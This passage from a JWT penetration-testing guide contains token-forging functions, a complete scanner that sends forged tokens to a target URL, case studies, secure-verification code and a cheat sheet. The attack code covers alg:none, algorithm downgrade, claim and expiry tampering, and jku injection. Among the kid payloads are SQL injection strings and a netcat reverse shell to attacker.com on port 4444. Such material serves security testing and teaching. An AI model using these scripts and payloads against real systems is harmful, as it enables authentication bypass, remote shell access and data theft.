    parts = token.split('.')
    
    # Decode payload
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # Modify claims
    payload['role'] = 'admin'
    payload['admin'] = True
    payload['user'] = 'victim'
    payload['email'] = 'admin@target.com'
    
    # Re-encode payload
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b'=').decode()
    
    # Reconstruct token (signature won't match)
    return f"{parts[0]}.{new_payload}.{parts[2]}"

# Usage - combine with key confusion or none algorithm
forged = manipulate_claims(original_token)
# Then sign with attacker's key or use alg:none
```

### JWT Expiration Bypass
```python
# Attack: Modify expiration timestamp

import base64
import json
import time

def bypass_expiration(token: str) -> str:
    """Set expiration to far future"""
    parts = token.split('.')
    
    # Decode payload
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # Set expiration to 10 years from now
    payload['exp'] = int(time.time()) + (10 * 365 * 24 * 60 * 60)
    payload['iat'] = int(time.time())
    
    # Re-encode
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b'=').decode()
    
    return f"{parts[0]}.{new_payload}.{parts[2]}"
```

---

## Automated JWT Testing Script
```python
#!/usr/bin/env python3
"""Comprehensive JWT vulnerability scanner"""

import jwt
import requests
import sys
import base64
import json
from typing import Optional, Dict, Any

class JWTScanner:
    def __init__(self, url: str, token: str):
        self.url = url
        self.token = token
        self.session = requests.Session()
        self.findings = []

    def decode_token(self) -> Dict[str, Any]:
        """Decode JWT without verification"""
        parts = self.token.split('.')
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        return {'header': header, 'payload': payload}

    def test_none_algorithm(self) -> bool:
        """Test for none algorithm acceptance"""
        parts = self.token.split('.')
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        
        # Set alg to none
        header['alg'] = 'none'
        new_header = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).rstrip(b'=').decode()
        
        # Remove signature
        forged = f"{new_header}.{parts[1]}."

        try:
            resp = self.session.get(
                self.url,
                headers={'Authorization': f'Bearer {forged}'},
                timeout=10
            )
            if resp.status_code == 200:
                self.findings.append({
                    'type': 'None Algorithm',
                    'severity': 'Critical',
                    'evidence': resp.status_code
                })
                return True
        except Exception:
            pass
        return False

    def test_algorithm_downgrade(self) -> bool:
        """Test for algorithm downgrade (RS256 → HS256)"""
        parts = self.token.split('.')
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        
        if header.get('alg') == 'RS256':
            # Try HS256 with public key
            header['alg'] = 'HS256'
            new_header = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).rstrip(b'=').decode()
            
            forged = f"{new_header}.{parts[1]}.{parts[2]}"
            
            try:
                resp = self.session.get(
                    self.url,
                    headers={'Authorization': f'Bearer {forged}'},
                    timeout=10
                )
                if resp.status_code == 200:
                    self.findings.append({
                        'type': 'Algorithm Downgrade',
                        'severity': 'Critical',
                        'evidence': resp.status_code
                    })
                    return True
            except Exception:
                pass
        return False

    def test_kid_injection(self) -> bool:
        """Test for kid parameter injection"""
        parts = self.token.split('.')
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        
        payloads = [
            '/dev/null',
            '../../../dev/null',
            "key' OR '1'='1",
            "key'; DROP TABLE--",
        ]
        
        for payload in payloads:
            header['kid'] = payload
            new_header = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).rstrip(b'=').decode()
            
            forged = f"{new_header}.{parts[1]}.{parts[2]}"
            
            try:
                resp = self.session.get(
                    self.url,
                    headers={'Authorization': f'Bearer {forged}'},
                    timeout=10
                )
                if resp.status_code == 200:
                    self.findings.append({
                        'type': 'Kid Injection',
                        'severity': 'Critical',
                        'evidence': payload
                    })
                    return True
            except Exception:
                pass
        return False

    def test_jku_injection(self) -> bool:
        """Test for JKU header injection"""
        parts = self.token.split('.')
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        
        header['jku'] = 'https://attacker.com/.well-known/jwks.json'
        new_header = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).rstrip(b'=').decode()
        
        forged = f"{new_header}.{parts[1]}.{parts[2]}"
        
        try:
            resp = self.session.get(
                self.url,
                headers={'Authorization': f'Bearer {forged}'},
                timeout=10
            )
            if resp.status_code == 200:
                self.findings.append({
                    'type': 'JKU Injection',
                    'severity': 'Critical',
                    'evidence': 'JKU accepted'
                })
                return True
        except Exception:
            pass
        return False

    def test_claim_manipulation(self) -> bool:
        """Test for claim manipulation"""
        parts = self.token.split('.')
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
        
        # Modify claims
        payload['role'] = 'admin'
        payload['admin'] = True
        payload['user'] = 'admin'
        
        new_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b'=').decode()
        
        forged = f"{parts[0]}.{new_payload}.{parts[2]}"
        
        try:
            resp = self.session.get(
                self.url,
                headers={'Authorization': f'Bearer {forged}'},
                timeout=10
            )
            if resp.status_code == 200:
                self.findings.append({
                    'type': 'Claim Manipulation',
                    'severity': 'High',
                    'evidence': 'Modified claims accepted'
                })
                return True
        except Exception:
            pass
        return False

    def test_expiration_bypass(self) -> bool:
        """Test for expiration bypass"""
        parts = self.token.split('.')
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
        
        # Set expiration to far future
        import time
        payload['exp'] = int(time.time()) + (10 * 365 * 24 * 60 * 60)
        
        new_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b'=').decode()
        
        forged = f"{parts[0]}.{new_payload}.{parts[2]}"
        
        try:
            resp = self.session.get(
                self.url,
                headers={'Authorization': f'Bearer {forged}'},
                timeout=10
            )
            if resp.status_code == 200:
                self.findings.append({
                    'type': 'Expiration Bypass',
                    'severity': 'Medium',
                    'evidence': 'Expired token accepted'
                })
                return True
        except Exception:
            pass
        return False

    def run_all(self):
        """Run all JWT tests"""
        print(f"[*] Testing JWT on: {self.url}")
        print(f"[*] Token: {self.token[:50]}...")
        
        self.test_none_algorithm()
        self.test_algorithm_downgrade()
        self.test_kid_injection()
        self.test_jku_injection()
        self.test_claim_manipulation()
        self.test_expiration_bypass()
        
        print(f"\n[*] Findings: {len(self.findings)}")
        for f in self.findings:
            print(f"  [{f['severity']}] {f['type']}: {f['evidence']}")
        
        return self.findings

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <token>")
        sys.exit(1)
    
    scanner = JWTScanner(sys.argv[1], sys.argv[2])
    scanner.run_all()
```

---

## Real-World JWT Attack Cases

### Case 7: Algorithm Confusion in Payment Platform
**Target**: Financial SaaS using RS256
**Attack**: Downloaded public key, converted to HMAC secret
**Payload**: `{"alg":"HS256","typ":"JWT"}` signed with public key bytes
**Result**: Admin access to all customer accounts
**Impact**: $2M+ in potential fraud
**Remediation**: Whitelist allowed algorithms, never mix asymmetric/symmetric

### Case 8: JKU Injection in SSO System
**Target**: Enterprise SSO using JKU for key distribution
**Attack**: Hosted malicious JWKS, injected JKU header
**Payload**: `{"jku":"https://evil.com/.well-known/jwks.json"}`
**Result**: Forged admin tokens accepted by server
**Impact**: Full SSO compromise
**Remediation**: Validate JKU URLs against whitelist

### Case 9: Kid SQL Injection in Healthcare API
**Target**: Healthcare API using kid for key selection
**Attack**: SQL injection via kid parameter
**Payload**: `{"kid":"key' UNION SELECT 'evil'--"}`
**Result**: Extracted database contents via SQL injection
**Impact**: 500K patient records exposed
**Remediation**: Use parameterized queries for kid lookup

### Case 10: None Algorithm in Mobile API
**Target**: REST API used by mobile application
**Attack**: Modified algorithm to none
**Payload**: `{"alg":"none","typ":"JWT"}`
**Result**: Forged tokens accepted, admin access
**Impact**: Full API compromise
**Remediation**: Never accept alg:none, require algorithm specification

### Case 11: Secret Brute-Force in Web App
**Target**: Web application using weak JWT secret
**Attack**: Brute-forced secret using common passwords
**Payload**: Common password list attack
**Result**: Recovered weak secret "secret123"
**Impact**: Token forgery, account takeover
**Remediation**: Use strong, randomly generated secrets

### Case 12: Key Rotation Bypass in Cloud Platform
**Target**: Cloud platform with key rotation
**Attack**: Used old token with previous key
**Payload**: Expired token with valid signature
**Result**: Bypassed key rotation, maintained access
**Impact**: Persistent admin access
**Remediation**: Implement proper token revocation on key rotation

---

## JWT Security Best Practices

### Algorithm Configuration
```python
# Secure JWT verification (Python)
import jwt

def verify_token_secure(token: str, public_key: str) -> dict:
    """Secure JWT verification"""
    try:
        # Specify allowed algorithms explicitly
        decoded = jwt.decode(
            token,
            public_key,
            algorithms=['RS256'],  # ONLY allow RS256
            options={
                'require': ['exp', 'iss', 'aud'],
                'verify_exp': True,
                'verify_iss': True,
                'verify_aud': True,
            }
        )
        return decoded
    except jwt.InvalidTokenError as e:
        raise ValueError(f"Invalid token: {e}")
```

### Key Management
```
1. Use strong, randomly generated secrets (256+ bits)
2. Rotate keys regularly
3. Store keys securely (HSM, KMS)
4. Never hardcode keys in source code
5. Use separate keys for different environments
6. Implement key revocation mechanisms
7. Monitor key usage for anomalies
```

### Validation Checklist
```
[ ] Verify algorithm matches expected value
[ ] Verify signature using correct key
[ ] Verify expiration (exp claim)
[ ] Verify not-before (nbf claim)
[ ] Verify issuer (iss claim)
[ ] Verify audience (aud claim)
[ ] Verify subject (sub claim)
[ ] Verify token ID (jti claim) for replay protection
[ ] Validate kid against known keys
[ ] Validate jku/x5u URLs against whitelist
```

---

## Reporting Templates

### JWT Finding Report
```
## JWT Authentication Bypass

### Vulnerability Summary
The application's JWT implementation is vulnerable to [attack type],
allowing an attacker to [impact].

### Affected Endpoint
[METHOD] [URL]
Authorization: Bearer [token]

### Attack Details
- Algorithm: [RS256/HS256/none]
- Vulnerability: [algorithm confusion/kid injection/jku injection]
- Impact: [privilege escalation/authentication bypass]

### Proof of Concept
1. [Step-by-step exploitation]
2. [Request/response evidence]
3. [Impact demonstration]

### Remediation
1. [Specific fix for the vulnerability]
2. [Additional security measures]
3. [Testing recommendations]
```

### JWT Risk Matrix
| Severity | Condition | CVSS |
|----------|-----------|------|
| Critical | Full auth bypass + admin | 9.8 |
| High | Auth bypass + limited access | 8.5 |
| High | Token forgery | 8.0 |
| Medium | Claim manipulation | 7.0 |
| Medium | Expiration bypass | 6.5 |
| Low | Information disclosure | 4.0 |

---

## Quick Reference Cheat Sheet

### None Algorithm
```python
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"user":"admin"}
# Signature: (empty)
token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
```

### Algorithm Downgrade
```python
# Original: RS256
# Downgrade: HS256
header['alg'] = 'HS256'
# Sign with public key bytes as HMAC secret
```

### Kid Injection
```python
# Path traversal
header['kid'] = '/dev/null'

# SQL injection
header['kid'] = "key' UNION SELECT 'evil'--"

# Command injection
header['kid'] = "key`; nc attacker.com 4444 -e /bin/sh`"
```

### JKU/X5U Injection
```python
# Host malicious JWKS
header['jku'] = 'https://attacker.com/.well-known/jwks.json'

# Host malicious certificate
header['x5u'] = 'https://attacker.com/cert.pem'
```

### Claim Manipulation
```python
payload['role'] = 'admin'
payload['admin'] = True
payload['user'] = 'victim'
payload['exp'] = far_future_timestamp
```

---

## Resources and References
- jwt_tool: https://github.com/ticarpi/jwt_tool
- JWT attacks: https://portswigger.net/web-security/jwt
- JWT security: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
- RFC 7519: https://tools.ietf.org/html/rfc7519
- HackTricks JWT: https://book.hacktricks.xyz/pentesting-web/authentication-bypass-via-cookies-manipulation
